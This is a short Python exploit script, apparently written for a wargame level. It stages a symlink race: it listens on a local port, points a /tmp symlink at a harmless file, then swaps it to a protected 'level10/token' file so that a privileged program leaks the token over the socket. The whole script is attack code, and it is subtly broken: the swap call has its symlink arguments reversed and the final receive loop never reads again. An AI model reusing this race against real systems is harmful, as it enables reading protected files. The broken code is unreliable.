import socket
import select
import os

link_name = "/tmp/symswitch"
ok_target = "/tmp/ok_target"
end_target = "/home/user/level10/token"

print("Creating server socket...")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 6969))

print("Creating symlink...")
n = 0
ok = False
while not ok:
    new_name = link_name + str(n)
    try:
        os.symlink(ok_target, new_name)
        link_name = new_name
        ok = True
        print("Link created " + link_name)
    except:
        n += 1
        print("Failed to create symlink")

print("Listening for connections...")
sock.setblocking(False)
sock.listen(1)

print("Waiting for connection...")
ready = select.select([sock], [], [], 999)
if not ready[0]:
    print("No connection within timeout")
    exit(1)

print("Switching symlink...")
if os.path.exists(link_name):
    print("Removing symlink...")
os.remove(link_name)
os.symlink(link_name, end_target)

print("Accepting connection...")
conn, addr = sock.accept()

msg = conn.recv(1024)
while len(msg) > 0:
    print(str(msg))